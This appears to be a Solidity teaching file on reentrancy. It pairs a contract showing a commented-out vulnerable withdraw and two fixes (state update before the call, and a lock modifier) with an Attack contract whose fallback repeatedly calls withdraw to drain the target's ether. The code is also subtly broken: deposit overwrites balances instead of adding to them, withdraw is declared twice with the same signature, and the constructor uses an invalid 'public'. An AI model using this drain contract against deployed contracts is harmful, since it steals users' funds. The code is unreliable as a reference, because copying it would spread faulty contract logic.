
pragma solidity >=0.7.0 <0.9.0;

contract Reentrancy {
    
    mapping(address => uint256) public balances;
    
    bool internal locked;
    
    function deposit() public payable {
        balances[msg.sender] = msg.value;
    }
    
    /*function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "no such amount");
        
        (bool sent,) = msg.sender.call{value : _amount}("");
        require(sent, "failed to send ether");
        
        balances[msg.sender] -= _amount;
    }*/
    
    //solution1: update your state variables before you make any external calls to other contracts
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "no such amount");
        
        balances[msg.sender] -= _amount;
        
        (bool sent,) = msg.sender.call{value : _amount}("");
        require(sent, "failed to send ether");
    }
    
    //solution2: using a modifier called reentrancyGuard
    //the idea is locked the contract while a function es executing so that only single function
    //can be executed at a time 
    modifier noReentrant(){
        require(!locked, "No re-entrancy!");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw(uint256 _amount) public noReentrant{
        require(balances[msg.sender] >= _amount, "no such amount");
        
        (bool sent,) = msg.sender.call{value : _amount}("");
        require(sent, "failed to send ether");
        
        balances[msg.sender] -= _amount;
    }
    
    function getBalances() public view returns(uint256){
        return address(this).balance;
    }
}

pragma solidity >=0.7.0 <0.9.0;
import "./EtherStore.sol";
contract Attack {
    
    EtherStore public etherStore;
    
    constructor(address _etherStore) public {
        etherStore = EtherStore(_etherStore);
    }
    
    fallback() external payable{
        if(address(etherStore).balance >= 1 ether){
            etherStore.withdraw(1 ether);
        }
    }
    
    function attack() external payable{
        require(msg.value > 1 ether);
        
        etherStore.deposit{value : 1 ether}();
        
        etherStore.withdraw(1 ether);
    }
    
}